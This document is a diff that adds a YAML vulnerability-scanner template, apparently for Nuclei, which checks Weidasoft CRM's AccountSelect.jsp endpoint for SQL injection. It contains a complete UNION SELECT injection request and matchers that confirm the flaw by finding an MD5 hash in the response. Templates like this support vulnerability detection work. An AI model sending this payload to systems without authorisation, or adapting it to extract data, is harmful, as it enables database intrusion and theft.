@@ -1,0 +1,35 @@
+id: poc-yaml-weidasoft-accountselect-sqli
+info:
+  name: Weidasoft CRM AccountSelect SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Vulnerability in Weidasoft CRM's AccountSelect functionality that allows SQL injection.
+    Exploits UNION SELECT to inject and verify SQL payloads.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /wap/common/AccountSelect.jsp?ids=1%29+UNION+ALL+SELECT+NULL%2CNULL%2CCHAR%28126%29%2Bsys.fn_sqlvarbasetostr(HashBytes('MD5','{{t1}}'))%2BCHAR%28126%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+x&returnType=11 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "window.parent.open"
+          - "AccountSelectCheckBoxClick"
+          - "用户选择"
+        part: body
+      - type: regex
+        regex:
+          - "0x{{t2}}"
+        part: body
